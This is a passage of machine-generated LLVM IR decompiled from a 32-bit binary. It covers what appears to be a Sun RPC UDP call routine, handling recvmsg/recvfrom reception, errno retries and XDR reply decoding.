dec_label_pc_8062760:                             ; preds = %dec_label_pc_8062753, %dec_label_pc_806274d
  %v4_8062760 = add i32 %stack_var_-9016.3161, 32
  %v0_8062767 = load i32, i32* @edi, align 4
  %v1_8062767 = add i32 %v0_8062767, -1
  store i32 %v1_8062767, i32* @edi, align 4
  %tmp131 = icmp slt i32 %v1_8062767, 1
  %tmp132 = icmp eq i1 %tmp131, false
  br i1 %tmp132, label %dec_label_pc_806271c, label %dec_label_pc_8062958

dec_label_pc_8062771:                             ; preds = %dec_label_pc_8062753
  %v0_8062771 = load i32, i32* @esi, align 4
  %v1_8062771 = add i32 %v0_8062771, 28
  %v2_8062771 = inttoptr i32 %v1_8062771 to i32*
  %v3_8062771 = load i32, i32* %v2_8062771, align 4
  store i32 %v3_8062771, i32* @ebx, align 4
  %v5_8062774 = add i32 %v3_8062771, %stack_var_-9004.2
  %v1_806277a = add i32 %v0_8062771, 32
  %v2_806277a = inttoptr i32 %v1_806277a to i32*
  %v3_806277a = load i32, i32* %v2_806277a, align 4
  store i32 %v3_806277a, i32* %eax.global-to-local, align 4
  %v5_806277d = add i32 %v3_806277a, %stack_var_-9008.2
  %v4_8062795162 = add i32 %v5_806277d, -999999
  %v9_8062795163 = sub i32 999998, %v5_806277d
  %v10_8062795164 = and i32 %v9_8062795163, %v5_806277d
  %v11_8062795165 = icmp slt i32 %v10_8062795164, 0
  %v12_8062795166 = icmp eq i32 %v4_8062795162, 0
  %v13_8062795167 = icmp slt i32 %v4_8062795162, 0
  %v3_806279f168 = icmp eq i1 %v13_8062795167, %v11_8062795165
  %v4_806279f169 = icmp eq i1 %v12_8062795166, false
  %v5_806279f170 = and i1 %v4_806279f169, %v3_806279f168
  br i1 %v5_806279f170, label %dec_label_pc_8062785, label %dec_label_pc_80627a1

dec_label_pc_8062785:                             ; preds = %dec_label_pc_8062771, %dec_label_pc_8062785
  %stack_var_-9004.3172 = phi i32 [ %v4_8062785, %dec_label_pc_8062785 ], [ %v5_8062774, %dec_label_pc_8062771 ]
  %storemerge7.in171 = phi i32 [ %v4_806278b, %dec_label_pc_8062785 ], [ %v5_806277d, %dec_label_pc_8062771 ]
  %v4_8062785 = add i32 %stack_var_-9004.3172, 1
  %v4_806278b = add i32 %storemerge7.in171, -1000000
  %v4_8062795 = add i32 %storemerge7.in171, -1999999
  %v9_8062795 = sub i32 1999998, %storemerge7.in171
  %v10_8062795 = and i32 %v9_8062795, %v4_806278b
  %v11_8062795 = icmp slt i32 %v10_8062795, 0
  %v12_8062795 = icmp eq i32 %v4_8062795, 0
  %v13_8062795 = icmp slt i32 %v4_8062795, 0
  %v3_806279f = icmp eq i1 %v13_8062795, %v11_8062795
  %v4_806279f = icmp eq i1 %v12_8062795, false
  %v5_806279f = and i1 %v4_806279f, %v3_806279f
  br i1 %v5_806279f, label %dec_label_pc_8062785, label %dec_label_pc_80627a1

dec_label_pc_80627a1:                             ; preds = %dec_label_pc_8062785, %dec_label_pc_8062771
  %storemerge7.in.lcssa = phi i32 [ %v5_806277d, %dec_label_pc_8062771 ], [ %v4_806278b, %dec_label_pc_8062785 ]
  %stack_var_-9004.3.lcssa = phi i32 [ %v5_8062774, %dec_label_pc_8062771 ], [ %v4_8062785, %dec_label_pc_8062785 ]
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v5_80627ad = icmp slt i32 %stack_var_-9004.3.lcssa, %storemerge3
  br i1 %v5_80627ad, label %dec_label_pc_8062639, label %dec_label_pc_80627b3

dec_label_pc_80627b3:                             ; preds = %dec_label_pc_80627a1
  %v15_80627a7 = icmp eq i32 %stack_var_-9004.3.lcssa, %storemerge3
  %v1_80627b3 = icmp eq i1 %v15_80627a7, false
  br i1 %v1_80627b3, label %dec_label_pc_80627c7, label %dec_label_pc_80627b5

dec_label_pc_80627b5:                             ; preds = %dec_label_pc_80627b3
  store i32 %stack_var_-9000.0, i32* %ecx.global-to-local, align 4
  %v5_80627c1 = icmp slt i32 %storemerge7.in.lcssa, %stack_var_-9000.0
  br i1 %v5_80627c1, label %dec_label_pc_8062639, label %dec_label_pc_80627c7

dec_label_pc_80627c7:                             ; preds = %dec_label_pc_80627b5, %dec_label_pc_80627b3, %dec_label_pc_806266c.dec_label_pc_80627c7_crit_edge
  %v0_80627cc = phi i32 [ %v0_80627cc.pre, %dec_label_pc_806266c.dec_label_pc_80627c7_crit_edge ], [ %v0_8062771, %dec_label_pc_80627b3 ], [ %v0_8062771, %dec_label_pc_80627b5 ]
  store i32 5, i32* %eax.global-to-local, align 4
  %v1_80627cc = add i32 %v0_80627cc, 44
  %v2_80627cc = inttoptr i32 %v1_80627cc to i32*
  store i32 5, i32* %v2_80627cc, align 4
  br label %dec_label_pc_8062a43

dec_label_pc_80627d8:                             ; preds = %dec_label_pc_80626ad
  %v1_80627d8 = call i32 @__errno_location(i32 %stack_var_-9008.2)
  store i32 %v1_80627d8, i32* %eax.global-to-local, align 4
  %v1_80627dd = inttoptr i32 %v1_80627d8 to i32*
  %v2_80627dd = load i32, i32* %v1_80627dd, align 4
  store i32 %v2_80627dd, i32* %eax.global-to-local, align 4
  %v1_80627df = add i32 %v2_80627dd, -4
  br label %dec_label_pc_806294f

dec_label_pc_80627e7:                             ; preds = %dec_label_pc_80626cb
  br i1 %v5_80627e7, label %dec_label_pc_8062911, label %dec_label_pc_80627f1

dec_label_pc_80627f1:                             ; preds = %dec_label_pc_80627e7
  store i32 %stack_var_-9028.2, i32* @ebx, align 4
  %v2_8062812 = sub i32 %v1_80626bf, %v1_8062805
  store i32 %v2_8062814, i32* %stack_var_-8980, align 4
  %v1_8062820 = add i32 %v2_8062812, 15
  %v1_806282a = and i32 %v1_8062820, -16
  store i32 %v1_806282a, i32* %edx.global-to-local, align 4
  %v2_806282d = add i32 %v2_8062812, -4
  %v3_806282d = inttoptr i32 %v2_806282d to i32*
  store i32 %v2_806281d, i32* %v3_806282d, align 4
  store i32 %v2_806282e, i32* %eax.global-to-local, align 4
  %v1_8062834 = add i32 %v2_8062812, -8
  %v2_8062834 = inttoptr i32 %v1_8062834 to i32*
  store i32 8192, i32* %v2_8062834, align 4
  %v0_8062839 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062839 = add i32 %v0_8062839, 256
  store i32 %v1_8062839, i32* @edi, align 4
  %v2_806283f = add i32 %v2_8062812, -12
  %v3_806283f = inttoptr i32 %v2_806283f to i32*
  store i32 %v2_806282e, i32* %v3_806283f, align 4
  %v0_8062840 = load i32, i32* @edi, align 4
  store i32 %v0_8062840, i32* %stack_var_-36, align 4
  %v0_8062857 = load i32, i32* %edx.global-to-local, align 4
  %v0_8062867 = load i32, i32* @esi, align 4
  %v1_8062867 = inttoptr i32 %v0_8062867 to i32*
  %v2_8062867 = load i32, i32* %v1_8062867, align 4
  %v4_8062867 = add i32 %v2_8062812, -16
  %v5_8062867 = inttoptr i32 %v4_8062867 to i32*
  store i32 %v2_8062867, i32* %v5_8062867, align 4
  %v0_8062869 = load i32, i32* %stack_var_-8980, align 4
  %v3_8062869 = call i32 @__libc_recvmsg(i32 %v0_8062869, i32 16, i32 %v2_806281d)
  store i32 %v3_8062869, i32* %eax.global-to-local, align 4
  %v0_806286e = load i32, i32* @esp, align 4
  %v1_806286e = add i32 %v0_806286e, 16
  store i32 %v3_8062869, i32* @ebx, align 4
  %v2_8062873 = icmp slt i32 %v3_8062869, 0
  br i1 %v2_8062873, label %dec_label_pc_8062911, label %dec_label_pc_806287b

dec_label_pc_806287b:                             ; preds = %dec_label_pc_80627f1
  %v2_806287b = add i32 %v0_806286e, 12
  %v3_806287b = inttoptr i32 %v2_806287b to i32*
  store i32 %v3_8062869, i32* %v3_806287b, align 4
  %v0_806287c = load i32, i32* @ebx, align 4
  %v2_806287c = add i32 %v0_806286e, 8
  %v3_806287c = inttoptr i32 %v2_806287c to i32*
  store i32 %v0_806287c, i32* %v3_806287c, align 4
  %v0_806287d = load i32, i32* @esi, align 4
  %v1_806287d = add i32 %v0_806287d, 88
  %v2_806287d = inttoptr i32 %v1_806287d to i32*
  %v3_806287d = load i32, i32* %v2_806287d, align 4
  %v5_806287d = add i32 %v0_806286e, 4
  %v6_806287d = inttoptr i32 %v5_806287d to i32*
  store i32 %v3_806287d, i32* %v6_806287d, align 4
  %v0_8062880 = load i32, i32* @edi, align 4
  %v3_8062880 = inttoptr i32 %v0_806286e to i32*
  store i32 %v0_8062880, i32* %v3_8062880, align 4
  %v0_8062881 = call i32 @bcmp()
  store i32 %v0_8062881, i32* %eax.global-to-local, align 4
  %v0_8062886 = load i32, i32* @esp, align 4
  %v1_8062886 = add i32 %v0_8062886, 16
  %v1_8062889 = icmp eq i32 %v0_8062881, 0
  %v1_806288b = icmp eq i1 %v1_8062889, false
  br i1 %v1_806288b, label %dec_label_pc_8062911, label %dec_label_pc_8062891

dec_label_pc_8062891:                             ; preds = %dec_label_pc_806287b
  br i1 %v5_8062891, label %dec_label_pc_8062911, label %dec_label_pc_806289a

dec_label_pc_806289a:                             ; preds = %dec_label_pc_8062891
  store i32 16, i32* %eax.global-to-local, align 4
  %v3_80628b0 = load i16, i16* %stack_var_-76, align 2
  %v14_80628b0 = icmp eq i16 %v3_80628b0, 2
  %v1_80628b5 = icmp eq i1 %v14_80628b0, false
  br i1 %v1_80628b5, label %dec_label_pc_8062911, label %dec_label_pc_80628b7

dec_label_pc_80628b7:                             ; preds = %dec_label_pc_806289a
  %v0_80628b7 = load i32, i32* @esi, align 4
  %v1_80628b7 = add i32 %v0_80628b7, 12
  store i32 %v1_80628b7, i32* %eax.global-to-local, align 4
  %v0_80628ba = load i32, i32* @ecx, align 4
  %v2_80628ba = add i32 %v0_8062886, 12
  %v3_80628ba = inttoptr i32 %v2_80628ba to i32*
  store i32 %v0_80628ba, i32* %v3_80628ba, align 4
  %v1_80628bb = add i32 %v0_8062886, 8
  %v2_80628bb = inttoptr i32 %v1_80628bb to i32*
  store i32 4, i32* %v2_80628bb, align 4
  %v0_80628bd = load i32, i32* %eax.global-to-local, align 4
  %v2_80628bd = add i32 %v0_8062886, 4
  %v3_80628bd = inttoptr i32 %v2_80628bd to i32*
  store i32 %v0_80628bd, i32* %v3_80628bd, align 4
  store i32 %v2_80628be, i32* %eax.global-to-local, align 4
  %v3_80628c1 = inttoptr i32 %v0_8062886 to i32*
  store i32 %v2_80628be, i32* %v3_80628c1, align 4
  %v0_80628c2 = call i32 @bcmp()
  store i32 %v0_80628c2, i32* %eax.global-to-local, align 4
  %v0_80628c7 = load i32, i32* @esp, align 4
  %v1_80628c7 = add i32 %v0_80628c7, 16
  %v1_80628ca = icmp eq i32 %v0_80628c2, 0
  %v1_80628cc = icmp eq i1 %v1_80628ca, false
  br i1 %v1_80628cc, label %dec_label_pc_8062911, label %dec_label_pc_80628ce

dec_label_pc_80628ce:                             ; preds = %dec_label_pc_80628b7
  %v6_80628ce = and i32 %v0_80628c2, -65536
  %v7_80628ce = or i32 %v6_80628ce, %v4_80628ce
  store i32 %v7_80628ce, i32* %eax.global-to-local, align 4
  %v2_80628d2 = load i32, i32* @esi, align 4
  %v3_80628d2 = add i32 %v2_80628d2, 10
  %v4_80628d2 = inttoptr i32 %v3_80628d2 to i16*
  %v5_80628d2 = load i16, i16* %v4_80628d2, align 2
  %v16_80628d2 = icmp eq i16 %tmp79, %v5_80628d2
  %v1_80628d6 = icmp eq i1 %v16_80628d2, false
  br i1 %v1_80628d6, label %dec_label_pc_8062911, label %dec_label_pc_80628d8

dec_label_pc_80628d8:                             ; preds = %dec_label_pc_80628ce
  store i32 %v0_8062857, i32* %eax.global-to-local, align 4
  %v1_806290d36 = icmp eq i32 %v0_8062857, 0
  %v1_806290f43 = icmp eq i1 %v1_806290d36, false
  br i1 %v1_806290f43, label %dec_label_pc_80628eb, label %dec_label_pc_8062911

dec_label_pc_80628eb:                             ; preds = %dec_label_pc_80628d8, %dec_label_pc_80628fb
  %v1_80628fb = phi i32 [ %v1_806290a, %dec_label_pc_80628fb ], [ %v1_80628c7, %dec_label_pc_80628d8 ]
  %v0_8062552 = phi i32 [ %v0_8062905, %dec_label_pc_80628fb ], [ %v0_8062857, %dec_label_pc_80628d8 ]
  %v1_80628eb = add i32 %v0_8062552, 4
  %v2_80628eb = inttoptr i32 %v1_80628eb to i32*
  %v3_80628eb = load i32, i32* %v2_80628eb, align 4
  %v4_80628eb = icmp eq i32 %v3_80628eb, 0
  %v1_80628ef = icmp eq i1 %v4_80628eb, false
  br i1 %v1_80628ef, label %dec_label_pc_80628fb, label %dec_label_pc_80628f1

dec_label_pc_80628f1:                             ; preds = %dec_label_pc_80628eb
  %v1_80628f1 = add i32 %v0_8062552, 8
  %v2_80628f1 = inttoptr i32 %v1_80628f1 to i32*
  %v3_80628f1 = load i32, i32* %v2_80628f1, align 4
  %v12_80628f1 = icmp eq i32 %v3_80628f1, 11
  br i1 %v12_80628f1, label %dec_label_pc_8062552, label %dec_label_pc_80628fb

dec_label_pc_80628fb:                             ; preds = %dec_label_pc_80628f1, %dec_label_pc_80628eb
  %v0_80628fb = load i32, i32* @edx, align 4
  %v2_80628fb = add i32 %v1_80628fb, -4
  %v3_80628fb = inttoptr i32 %v2_80628fb to i32*
  store i32 %v0_80628fb, i32* %v3_80628fb, align 4
  %v0_80628fc = load i32, i32* @edx, align 4
  %v2_80628fc = add i32 %v1_80628fb, -8
  %v3_80628fc = inttoptr i32 %v2_80628fc to i32*
  store i32 %v0_80628fc, i32* %v3_80628fc, align 4
  %v0_80628fd = load i32, i32* %eax.global-to-local, align 4
  %v2_80628fd = add i32 %v1_80628fb, -12
  %v3_80628fd = inttoptr i32 %v2_80628fd to i32*
  store i32 %v0_80628fd, i32* %v3_80628fd, align 4
  store i32 %v2_806282e, i32* %eax.global-to-local, align 4
  %v2_8062904 = add i32 %v1_80628fb, -16
  %v3_8062904 = inttoptr i32 %v2_8062904 to i32*
  store i32 %v2_806282e, i32* %v3_8062904, align 4
  %v0_8062905 = call i32 @__cmsg_nxthdr()
  store i32 %v0_8062905, i32* %eax.global-to-local, align 4
  %v0_806290a = load i32, i32* @esp, align 4
  %v1_806290a = add i32 %v0_806290a, 16
  %v1_806290d = icmp eq i32 %v0_8062905, 0
  %v1_806290f = icmp eq i1 %v1_806290d, false
  br i1 %v1_806290f, label %dec_label_pc_80628eb, label %dec_label_pc_8062911

dec_label_pc_8062911:                             ; preds = %dec_label_pc_80628ce, %dec_label_pc_80628b7, %dec_label_pc_806289a, %dec_label_pc_8062891, %dec_label_pc_806287b, %dec_label_pc_80627f1, %dec_label_pc_80627e7, %dec_label_pc_80628d8, %dec_label_pc_80628fb, %dec_label_pc_806293b.dec_label_pc_8062911_crit_edge
  %v1_8062914 = phi i32 [ %v1_8062914.pre, %dec_label_pc_806293b.dec_label_pc_8062911_crit_edge ], [ %v1_80628c7, %dec_label_pc_80628d8 ], [ %v1_80628c7, %dec_label_pc_80628ce ], [ %v1_80628c7, %dec_label_pc_80628b7 ], [ %v1_8062886, %dec_label_pc_806289a ], [ %v1_8062886, %dec_label_pc_8062891 ], [ %v1_8062886, %dec_label_pc_806287b ], [ %v1_806286e, %dec_label_pc_80627f1 ], [ %v1_80626bf, %dec_label_pc_80627e7 ], [ %v1_806290a, %dec_label_pc_80628fb ]
  %v0_8062914 = phi i32 [ %v1_806293b, %dec_label_pc_806293b.dec_label_pc_8062911_crit_edge ], [ %v0_8062857, %dec_label_pc_80628d8 ], [ %v7_80628ce, %dec_label_pc_80628ce ], [ %v0_80628c2, %dec_label_pc_80628b7 ], [ 16, %dec_label_pc_806289a ], [ %v0_8062881, %dec_label_pc_8062891 ], [ %v0_8062881, %dec_label_pc_806287b ], [ %v3_8062869, %dec_label_pc_80627f1 ], [ %v5_80626ba, %dec_label_pc_80627e7 ], [ %v0_8062905, %dec_label_pc_80628fb ]
  store i32 %v2_8062911, i32* %edx.global-to-local, align 4
  %v2_8062914 = add i32 %v1_8062914, -4
  %v3_8062914 = inttoptr i32 %v2_8062914 to i32*
  store i32 %v0_8062914, i32* %v3_8062914, align 4
  %v0_8062915 = load i32, i32* %eax.global-to-local, align 4
  %v2_8062915 = add i32 %v1_8062914, -8
  %v3_8062915 = inttoptr i32 %v2_8062915 to i32*
  store i32 %v0_8062915, i32* %v3_8062915, align 4
  store i32 %v2_8062916, i32* %eax.global-to-local, align 4
  %v2_8062919 = add i32 %v1_8062914, -12
  %v3_8062919 = inttoptr i32 %v2_8062919 to i32*
  store i32 %v2_8062916, i32* %v3_8062919, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v2_8062921 = add i32 %v1_8062914, -16
  %v3_8062921 = inttoptr i32 %v2_8062921 to i32*
  store i32 %v2_8062911, i32* %v3_8062921, align 4
  %v1_8062922 = add i32 %v1_8062914, -20
  %v2_8062922 = inttoptr i32 %v1_8062922 to i32*
  store i32 0, i32* %v2_8062922, align 4
  %v0_8062924 = load i32, i32* @esi, align 4
  %v1_8062924 = add i32 %v0_8062924, 92
  %v2_8062924 = inttoptr i32 %v1_8062924 to i32*
  %v3_8062924 = load i32, i32* %v2_8062924, align 4
  %v5_8062924 = add i32 %v1_8062914, -24
  %v6_8062924 = inttoptr i32 %v5_8062924 to i32*
  store i32 %v3_8062924, i32* %v6_8062924, align 4
  %v0_8062927 = load i32, i32* @esi, align 4
  %v1_8062927 = add i32 %v0_8062927, 96
  store i32 %v1_8062927, i32* @ebx, align 4
  %v2_806292a = add i32 %v1_8062914, -28
  %v3_806292a = inttoptr i32 %v2_806292a to i32*
  store i32 %v1_8062927, i32* %v3_806292a, align 4
  %v0_806292b = load i32, i32* @esi, align 4
  %v1_806292b = inttoptr i32 %v0_806292b to i32*
  %v2_806292b = load i32, i32* %v1_806292b, align 4
  %v4_806292b = add i32 %v1_8062914, -32
  %v5_806292b = inttoptr i32 %v4_806292b to i32*
  store i32 %v2_806292b, i32* %v5_806292b, align 4
  %v0_806292d = load i32, i32* %stack_var_-20, align 4
  %v4_806292d = load i32, i32* %stack_var_-4, align 4
  %v5_806292d = load i32, i32* %stack_var_0, align 4
  %v6_806292d = call i32 @__libc_recvfrom(i32 %v0_806292d, i32 %v0_80624f9, i32 %v0_80624f8, i32 %v0_80624f7, i32 %v4_806292d, i32 %v5_806292d)
  store i32 %v6_806292d, i32* %eax.global-to-local, align 4
  %v0_8062932 = load i32, i32* @esp, align 4
  %v1_8062932 = add i32 %v0_8062932, 32
  store i32 %v6_806292d, i32* @ecx, align 4
  %v2_8062937 = icmp slt i32 %v6_806292d, 0
  %v1_8062939 = icmp eq i1 %v2_8062937, false
  br i1 %v1_8062939, label %dec_label_pc_8062969, label %dec_label_pc_806293b

dec_label_pc_806293b:                             ; preds = %dec_label_pc_8062911
  %v0_806293b = load i32, i32* %stack_var_-20, align 4
  %v1_806293b = call i32 @__errno_location(i32 %v0_806293b)
  store i32 %v1_806293b, i32* %eax.global-to-local, align 4
  %v1_8062940 = inttoptr i32 %v1_806293b to i32*
  %v2_8062940 = load i32, i32* %v1_8062940, align 4
  %v11_8062940 = icmp eq i32 %v2_8062940, 4
  br i1 %v11_8062940, label %dec_label_pc_806293b.dec_label_pc_8062911_crit_edge, label %dec_label_pc_8062945

dec_label_pc_806293b.dec_label_pc_8062911_crit_edge: ; preds = %dec_label_pc_806293b
  %v1_8062914.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8062911

dec_label_pc_8062945:                             ; preds = %dec_label_pc_806293b
  %v0_8062945 = load i32, i32* %stack_var_-20, align 4
  %v1_8062945 = call i32 @__errno_location(i32 %v0_8062945)
  store i32 %v1_8062945, i32* %eax.global-to-local, align 4
  %v1_806294a = inttoptr i32 %v1_8062945 to i32*
  %v2_806294a = load i32, i32* %v1_806294a, align 4
  store i32 %v2_806294a, i32* %eax.global-to-local, align 4
  %v1_806294c = add i32 %v2_806294a, -11
  br label %dec_label_pc_806294f

dec_label_pc_806294f:                             ; preds = %dec_label_pc_80627d8, %dec_label_pc_8062945
  %v0_806295576 = phi i32 [ %v2_80627dd, %dec_label_pc_80627d8 ], [ %v2_806294a, %dec_label_pc_8062945 ]
  %storemerge8.in = phi i32 [ %v1_80627df, %dec_label_pc_80627d8 ], [ %v1_806294c, %dec_label_pc_8062945 ]
  %storemerge8 = icmp eq i32 %storemerge8.in, 0
  br i1 %storemerge8, label %dec_label_pc_806294f.dec_label_pc_80626ad.backedge_crit_edge, label %dec_label_pc_8062955

dec_label_pc_806294f.dec_label_pc_80626ad.backedge_crit_edge: ; preds = %dec_label_pc_806294f
  %v0_80626ad.pre.pre = load i32, i32* @ecx, align 4
  %v1_80626ad.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80626ad

dec_label_pc_8062955:                             ; preds = %dec_label_pc_806294f, %dec_label_pc_8062552
  %v0_8062955 = phi i32 [ %v3_8062552, %dec_label_pc_8062552 ], [ %v0_806295576, %dec_label_pc_806294f ]
  %v1_8062955 = load i32, i32* @esi, align 4
  %v2_8062955 = add i32 %v1_8062955, 48
  %v3_8062955 = inttoptr i32 %v2_8062955 to i32*
  store i32 %v0_8062955, i32* %v3_8062955, align 4
  br label %dec_label_pc_8062958

dec_label_pc_8062958:                             ; preds = %dec_label_pc_80626d3, %dec_label_pc_806270b, %dec_label_pc_806271c, %dec_label_pc_8062760, %dec_label_pc_8062955
  store i32 4, i32* %eax.global-to-local, align 4
  %v0_806295d = load i32, i32* @esi, align 4
  %v1_806295d = add i32 %v0_806295d, 44
  %v2_806295d = inttoptr i32 %v1_806295d to i32*
  store i32 4, i32* %v2_806295d, align 4
  br label %dec_label_pc_8062a43

dec_label_pc_8062969:                             ; preds = %dec_label_pc_8062911
  %v7_806296c = icmp sgt i32 %v6_806292d, 3
  br i1 %v7_806296c, label %dec_label_pc_8062972, label %dec_label_pc_80626ad

dec_label_pc_8062972:                             ; preds = %dec_label_pc_8062969
  br i1 %v4_806259d, label %dec_label_pc_8062986, label %dec_label_pc_8062978

dec_label_pc_8062978:                             ; preds = %dec_label_pc_8062972
  %v0_8062978 = load i32, i32* @esi, align 4
  %v1_8062978 = add i32 %v0_8062978, 88
  %v2_8062978 = inttoptr i32 %v1_8062978 to i32*
  %v3_8062978 = load i32, i32* %v2_8062978, align 4
  store i32 %v3_8062978, i32* %edx.global-to-local, align 4
  %v1_806297b = add i32 %v0_8062978, 96
  %v2_806297b = inttoptr i32 %v1_806297b to i32*
  %v3_806297b = load i32, i32* %v2_806297b, align 4
  store i32 %v3_806297b, i32* %eax.global-to-local, align 4
  %v2_806297e = inttoptr i32 %v3_8062978 to i32*
  %v3_806297e = load i32, i32* %v2_806297e, align 4
  %v14_806297e = icmp eq i32 %v3_806297b, %v3_806297e
  %v1_8062980 = icmp eq i1 %v14_806297e, false
  br i1 %v1_8062980, label %dec_label_pc_80626ad, label %dec_label_pc_8062986

dec_label_pc_8062986:                             ; preds = %dec_label_pc_8062978, %dec_label_pc_8062972
  %v1_8062986 = add i32 %v0_8062932, 28
  %v2_8062986 = inttoptr i32 %v1_8062986 to i32*
  store i32 1, i32* %v2_8062986, align 4
  %v0_8062988 = load i32, i32* @ecx, align 4
  %v2_8062988 = add i32 %v0_8062932, 24
  %v3_8062988 = inttoptr i32 %v2_8062988 to i32*
  store i32 %v0_8062988, i32* %v3_8062988, align 4
  %v0_8062989 = load i32, i32* @ebx, align 4
  %v2_8062989 = add i32 %v0_8062932, 20
  %v3_8062989 = inttoptr i32 %v2_8062989 to i32*
  store i32 %v0_8062989, i32* %v3_8062989, align 4
  store i32 %v2_806298a, i32* @ebx, align 4
  %v2_806298d = add i32 %v0_8062932, 16
  %v3_806298d = inttoptr i32 %v2_806298d to i32*
  store i32 %v2_806298a, i32* %v3_806298d, align 4
  %v0_806298e = load i32, i32* %stack_var_-20, align 4
  %v4_806298e = inttoptr i32 %v0_806298e to i32*
  %v5_806298e = call i32 @__GI_xdrmem_create(i32* %v4_806298e, i32 %v0_80624f9, i32 %v0_80624f8, i32 %v0_80624f7)
  store i32 %v5_806298e, i32* %eax.global-to-local, align 4
  %v0_8062993 = load i32, i32* @esp, align 4
  %v1_8062993 = inttoptr i32 %v0_8062993 to i32*
  %v3_8062993 = add i32 %v0_8062993, 4
  store i32 %v2_8062994, i32* @edi, align 4
  %v1_806299a = inttoptr i32 %v3_8062993 to i32*
  %v2_806299a = load i32, i32* %v1_806299a, align 4
  store i32 %v2_806299a, i32* @eax, align 4
  store i32 %v2_8062994, i32* %v1_806299a, align 4
  store i32 %v2_806298a, i32* %v1_8062993, align 4
  %v0_806299d = call i32 @__GI_xdr_replymsg()
  store i32 %v0_806299d, i32* %eax.global-to-local, align 4
  %v0_80629a2 = load i32, i32* @esp, align 4
  %v1_80629a5 = icmp eq i32 %v0_806299d, 0
  %v0_8062a39 = load i32, i32* @esi, align 4
  %v1_8062a39 = add i32 %v0_8062a39, 44
  br i1 %v1_80629a5, label %dec_label_pc_8062a39, label %dec_label_pc_80629ad

dec_label_pc_80629ad:                             ; preds = %dec_label_pc_8062986
  store i32 %v1_8062a39, i32* %eax.global-to-local, align 4
  %v0_80629b0 = load i32, i32* @ecx, align 4
  %v2_80629b0 = add i32 %v0_80629a2, 12
  %v3_80629b0 = inttoptr i32 %v2_80629b0 to i32*
  store i32 %v0_80629b0, i32* %v3_80629b0, align 4
  %v0_80629b1 = load i32, i32* @ecx, align 4
  %v2_80629b1 = add i32 %v0_80629a2, 8
  %v3_80629b1 = inttoptr i32 %v2_80629b1 to i32*
  store i32 %v0_80629b1, i32* %v3_80629b1, align 4
  %v0_80629b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80629b2 = add i32 %v0_80629a2, 4
  %v3_80629b2 = inttoptr i32 %v2_80629b2 to i32*
  store i32 %v0_80629b2, i32* %v3_80629b2, align 4
  %v3_80629b3 = inttoptr i32 %v0_80629a2 to i32*
  store i32 %v2_8062994, i32* %v3_80629b3, align 4
  %v0_80629b4 = call i32 @__GI__seterr_reply()
  store i32 %v0_80629b4, i32* %eax.global-to-local, align 4
  %v0_80629b9 = load i32, i32* @esp, align 4
  %v0_80629bc = load i32, i32* @esi, align 4
  %v1_80629bc = add i32 %v0_80629bc, 44
  %v2_80629bc = inttoptr i32 %v1_80629bc to i32*
  %v3_80629bc = load i32, i32* %v2_80629bc, align 4
  %v4_80629bc = icmp eq i32 %v3_80629bc, 0
  %v1_80629c0 = icmp eq i1 %v4_80629bc, false
  br i1 %v1_80629c0, label %dec_label_pc_8062a0f, label %dec_label_pc_80629c2

dec_label_pc_80629c2:                             ; preds = %dec_label_pc_80629ad
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  store i32 %v2_8062679, i32* @ebx, align 4
  %v2_80629cb = load i32, i32* %arg1, align 4
  store i32 %v2_80629cb, i32* %eax.global-to-local, align 4
  %v2_80629cd = add i32 %v0_80629b9, 12
  %v3_80629cd = inttoptr i32 %v2_80629cd to i32*
  store i32 %tmp111, i32* %v3_80629cd, align 4
  %v0_80629ce = load i32, i32* %edx.global-to-local, align 4
  %v2_80629ce = add i32 %v0_80629b9, 8
  %v3_80629ce = inttoptr i32 %v2_80629ce to i32*
  store i32 %v0_80629ce, i32* %v3_80629ce, align 4
  %v1_80629cf = add i32 %v2_80629cb, 32
  %v2_80629cf = inttoptr i32 %v1_80629cf to i32*
  %v3_80629cf = load i32, i32* %v2_80629cf, align 4
  store i32 %v3_80629cf, i32* %edx.global-to-local, align 4
  %v2_80629d2 = add i32 %v0_80629b9, 4
  %v3_80629d2 = inttoptr i32 %v2_80629d2 to i32*
  store i32 %v2_8062679, i32* %v3_80629d2, align 4
  %v3_80629d3 = inttoptr i32 %v0_80629b9 to i32*
  store i32 %v2_80629cb, i32* %v3_80629d3, align 4
  %v1_80629d4 = add i32 %v0_80629b9, -4
  %v2_80629d4 = inttoptr i32 %v1_80629d4 to i32*
  store i32 134621655, i32* %v2_80629d4, align 4
  %v3_80629d4 = load i32, i32* %edx.global-to-local, align 4
  %v4_80629d4 = add i32 %v3_80629d4, 8
  %v5_80629d4 = inttoptr i32 %v4_80629d4 to i32*
  %v6_80629d4 = load i32, i32* %v5_80629d4, align 4
  call void @__pseudo_call(i32 %v6_80629d4)
  %v1_80629da = icmp eq i32 %v2_80629cb, 0
  %v1_80629dc = icmp eq i1 %v1_80629da, false
  br i1 %v1_80629dc, label %dec_label_pc_80629ec, label %dec_label_pc_80629de

dec_label_pc_80629de:                             ; preds = %dec_label_pc_80629c2
  %v0_80629de = load i32, i32* @esi, align 4
  %v1_80629de = add i32 %v0_80629de, 44
  %v2_80629de = inttoptr i32 %v1_80629de to i32*
  store i32 7, i32* %v2_80629de, align 4
  %v0_80629e5 = load i32, i32* @esi, align 4
  %v1_80629e5 = add i32 %v0_80629e5, 48
  %v2_80629e5 = inttoptr i32 %v1_80629e5 to i32*
  store i32 6, i32* %v2_80629e5, align 4
  br label %dec_label_pc_80629ec

dec_label_pc_80629ec:                             ; preds = %dec_label_pc_80629c2, %dec_label_pc_80629de
  %v4_80629ec = icmp eq i32 %tmp, 0
  br i1 %v4_80629ec, label %dec_label_pc_8062a40, label %dec_label_pc_80629f5

dec_label_pc_80629f5:                             ; preds = %dec_label_pc_80629ec
  store i32 %v1_8062594, i32* %ecx.global-to-local, align 4
  %v1_80629fb = inttoptr i32 %v1_8062594 to i32*
  store i32 2, i32* %v1_80629fb, align 4
  %v1_8062a01 = load i32, i32* @esp, align 4
  %v2_8062a01 = add i32 %v1_8062a01, -4
  %v3_8062a01 = inttoptr i32 %v2_8062a01 to i32*
  store i32 %v2_8062994, i32* %v3_8062a01, align 4
  %v2_8062a02 = add i32 %v1_8062a01, -8
  %v3_8062a02 = inttoptr i32 %v2_8062a02 to i32*
  store i32 %v2_8062994, i32* %v3_8062a02, align 4
